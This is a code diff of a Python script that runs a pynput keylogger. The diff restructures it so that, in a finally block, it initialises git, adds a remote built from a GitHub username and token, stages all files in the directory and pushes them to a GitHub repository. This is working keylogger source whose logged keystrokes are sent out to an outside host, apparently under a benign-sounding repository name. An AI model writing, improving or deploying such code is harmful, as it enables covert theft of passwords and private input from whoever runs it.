@@ -27,31 +27,34 @@ def start_keylogger():
     with pynput.keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# Change to your project directory
-project_dir = os.getcwd()
-os.chdir(project_dir)
 
-# Initialize a Git repository if not already initialized
-subprocess.run(['git', 'init'])
+try:
+    if __name__ == "__main__":
+        print("Keylogger started. Press 'Ctrl+C' to stop.")
+        start_keylogger()
+finally:
+    # Change to your project directory
+    project_dir = os.getcwd()
+    os.chdir(project_dir)
 
-# Set your GitHub repository remote URL
-github_username = os.getenv('GITHUB_USERNAME')
-github_token = os.getenv('GITHUB_TOKEN')
-github_repo_url = f"https://{github_username}:{github_token}@github.com/efffectery/VeryUseFullScript"
+    # Initialize a Git repository if not already initialized
+    subprocess.run(['git', 'init'])
 
-# Add the remote if not already added
-subprocess.run(['git', 'remote', 'add', 'origin', github_repo_url])
+    # Set your GitHub repository remote URL
+    github_username = os.getenv('GITHUB_USERNAME')
+    github_token = os.getenv('GITHUB_TOKEN')
+    github_repo_url = f"https://{github_username}:{github_token}@github.com/efffectery/VeryUseFullScript"
 
-# Add the .txt file or all files in the folder to the Git staging area
-subprocess.run(['git', 'add', '.'])
+    # Add the remote if not already added
+    subprocess.run(['git', 'remote', 'add', 'origin', github_repo_url])
 
-# Commit the changes
-subprocess.run(['git', 'commit', '-m', 'Updated'])
+    # Add the .txt file or all files in the folder to the Git staging area
+    subprocess.run(['git', 'add', '.'])
 
-# Push to GitHub
-subprocess.run(['git', 'push', '-u', 'origin', 'main'])
+    # Commit the changes
+    subprocess.run(['git', 'commit', '-m', 'Updated'])
 
-if __name__ == "__main__":
-    print("Keylogger started. Press 'Ctrl+C' to stop.")
-    start_keylogger()
+    # Push to GitHub
+    subprocess.run(['git', 'push', '-u', 'origin', 'main'])
+
 
